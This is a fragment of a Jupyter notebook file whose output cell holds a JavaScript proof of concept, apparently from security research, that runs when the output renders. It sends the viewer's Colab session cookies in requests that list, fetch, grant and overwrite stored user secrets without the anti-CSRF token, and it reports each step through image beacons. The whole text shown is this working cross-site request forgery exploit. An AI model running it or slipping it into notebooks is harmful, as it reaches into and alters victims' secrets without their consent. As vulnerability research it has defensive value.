      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(async function poc57() {\n  var BASE = 'https://colab.research.google.com/__poc57';\n  var NB   = 'YOUR_NOTEBOOK_FILE_ID_HERE';\n  var KEY  = 'CSRF_TEST_KEY';\n  var AU   = 'authuser=0';  // try 0 first; server will 401 if wrong user index\n\n  function B(tag, val) {\n    new Image().src = BASE + '/' + tag +\n      (val !== undefined ? '?d=' + encodeURIComponent(String(val).slice(0,400)) : '');\n  }\n\n  B('start');\n\n  // \u2500\u2500 TEST 1: GET /userdata/list?authuser=0 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // 200 = authenticated, returns JSON list of secret names\n  // 400 = still missing params (check Caido body for which param)\n  // 401 = wrong authuser index (try authuser=1)\n  try {\n    await fetch('https://colab.research.google.com/userdata/list?' + AU, {\n      method: 'GET', credentials: 'include', mode: 'no-cors'\n    });\n    B('get-list');\n  } catch(e) { B('get-list-err', e.message); }\n\n  // \u2500\u2500 TEST 2: GET /userdata/get?authuser=0&notebookid=NB&key=KEY \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // If NB is set correctly and grant exists \u2192 returns secret payload\n  // Caido sees the JSON response body\n  try {\n    await fetch(\n      'https://colab.research.google.com/userdata/get?' + AU +\n      '&notebookid=' + encodeURIComponent(NB) + '&key=' + encodeURIComponent(KEY),\n      { method: 'GET', credentials: 'include', mode: 'no-cors' }\n    );\n    B('get-secret');\n  } catch(e) { B('get-secret-err', e.message); }\n\n  // \u2500\u2500 TEST 3: POST /userdata/grant?authuser=0 \u2014 NO X-Goog-Colab-Token \u2500\u2500\u2500\u2500\u2500\u2500\n  // THE CSRF TEST: server must validate XSRF token.\n  // 200 = CSRF works \u2192 grant created without token \u2192 critical finding\n  // 400/403 = XSRF enforced (note: 400 here = app-level, not infra-level)\n  try {\n    var fd1 = new FormData();\n    fd1.append('key', KEY);\n    fd1.append('notebookid', NB);\n    await fetch('https://colab.research.google.com/userdata/grant?' + AU, {\n      method: 'POST', credentials: 'include', mode: 'no-cors', body: fd1\n    });\n    B('post-grant');\n  } catch(e) { B('post-grant-err', e.message); }\n\n  // \u2500\u2500 TEST 4: POST /userdata/grant with blank token in BODY \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // Can't set X-Goog-Colab-Token header (no-cors blocks custom headers).\n  // Try passing token as form field \u2014 some servers read token from body too.\n  try {\n    var fd2 = new FormData();\n    fd2.append('key', KEY);\n    fd2.append('notebookid', NB);\n    fd2.append('token', '');\n    await fetch('https://colab.research.google.com/userdata/grant?' + AU, {\n      method: 'POST', credentials: 'include', mode: 'no-cors', body: fd2\n    });\n    B('post-grant-notoken');\n  } catch(e) { B('post-grant-notoken-err', e.message); }\n\n  // \u2500\u2500 TEST 5: POST /userdata/set?authuser=0 \u2014 write arbitrary secret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n  // 200 = write CSRF confirmed (attacker can create/overwrite victim secrets)\n  try {\n    var fd3 = new FormData();\n    fd3.append('key', 'CSRF_WRITE_TEST');\n    fd3.append('payload', 'csrf_confirmed_poc57');\n    await fetch('https://colab.research.google.com/userdata/set?' + AU, {\n      method: 'POST', credentials: 'include', mode: 'no-cors', body: fd3\n    });\n    B('post-set');\n  } catch(e) { B('post-set-err', e.message); }\n\n  B('done');\n})();\n",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {}
        }
      ],
      "execution_count": 1
    }
  ]
}